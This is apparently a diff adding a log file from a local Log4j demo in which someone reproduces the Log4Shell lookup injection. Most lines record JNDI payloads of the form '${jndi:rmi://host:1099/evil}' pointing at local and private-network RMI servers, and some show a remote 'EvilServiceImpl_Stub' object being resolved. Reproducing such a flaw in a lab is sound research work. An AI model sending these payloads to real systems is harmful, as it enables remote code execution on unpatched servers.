@@ -1,0 +1,21 @@
+2021-12-11 12:59:59.650 [main] INFO com.hand.log.Log4jDemo - Hello,${os} 
+2021-12-11 13:00:43.533 [main] INFO com.hand.log.Log4jDemo - Hello,Windows 10 10.0, architecture: amd64-64 
+2021-12-11 13:08:52.430 [main] INFO com.hand.log.Log4jDemo - Hello,${jndi:rmi://127.0.0.1:1099/evil} 
+2021-12-11 13:11:00.631 [main] INFO com.hand.log.Log4jDemo - Hello,${jndi:rmi://127.0.0.1:1099/evil} !
+2021-12-11 13:12:02.793 [main] INFO com.hand.log.Log4jDemo - Hello,${jndi:rmi://192.168.1.13:1099/evil} !
+2021-12-11 13:18:29.989 [main] INFO com.hand.log.Log4jDemo - Hello,${jndi:rmi://192.168.1.13:1099/evil} !
+2021-12-11 13:29:06.629 [main] INFO com.hand.log.Log4jDemo - Hello,${jndi:rmi://192.168.1.13:1099/evil} !
+2021-12-11 13:29:23.924 [main] INFO com.hand.log.Log4jDemo - Hello,${jndi:rmi://192.168.1.13:1099/evil} !
+2021-12-11 13:31:11.432 [main] INFO com.hand.log.Log4jDemo - Hello,${jndi:rmi://192.168.1.13:1099/evil} !
+2021-12-11 13:31:58.942 [main] INFO com.hand.log.Log4jDemo - Hello,${jndi:rmi://192.168.1.13:1099/evil} !
+2021-12-11 13:33:14.823 [main] INFO com.hand.log.Log4jDemo - Hello,${jndi:rmi://192.168.1.13:1099/evil} !
+2021-12-11 13:34:18.137 [main] INFO com.hand.log.Log4jDemo - Hello,${jndi:rmi://192.168.1.13:1099/evil} !
+2021-12-11 13:48:24.378 [main] INFO com.hand.log.Log4jDemo - Hello,EvilServiceImpl_Stub[UnicastRef [liveRef: [endpoint:[172.26.240.1:1105](remote),objID:[-1a581445:17da808afa4:-7fff, 111273986210051030]]]] !
+2021-12-11 13:53:04.662 [main] INFO com.hand.log.Log4jDemo - Hello,EvilServiceImpl_Stub[UnicastRef [liveRef: [endpoint:[172.26.240.1:1105](remote),objID:[-1a581445:17da808afa4:-7fff, 111273986210051030]]]] !
+2021-12-11 13:53:28.131 [main] INFO com.hand.log.Log4jDemo - Hello,EvilServiceImpl_Stub[UnicastRef [liveRef: [endpoint:[172.26.240.1:1105](remote),objID:[-1a581445:17da808afa4:-7fff, 111273986210051030]]]] !
+2021-12-11 13:54:07.989 [main] INFO com.hand.log.Log4jDemo - Hello,EvilServiceImpl_Stub[UnicastRef [liveRef: [endpoint:[172.26.240.1:1105](remote),objID:[-1a581445:17da808afa4:-7fff, 111273986210051030]]]] !
+2021-12-11 14:01:05.434 [main] INFO com.hand.log.Log4jDemo - Hello,EvilServiceImpl_Stub[UnicastRef [liveRef: [endpoint:[172.26.240.1:1105](remote),objID:[-1a581445:17da808afa4:-7fff, 111273986210051030]]]] !
+2021-12-11 14:02:27.796 [main] INFO com.hand.log.Log4jDemo - Hello,${jndi:rmi://127.0.0.1:1099/evil} !
+2021-12-11 14:04:18.187 [main] INFO com.hand.log.Log4jDemo - Hello,${jndi:rmi://127.0.0.1:1099/evil} !
+2021-12-11 14:09:32.498 [main] INFO com.hand.log.Log4jDemo - Hello,${jndi:rmi://127.0.0.1:1099/evil} !
+2021-12-11 14:11:18.045 [main] INFO com.hand.log.Log4jDemo - Hello,${jndi:rmi://127.0.0.1:1099/evil} !
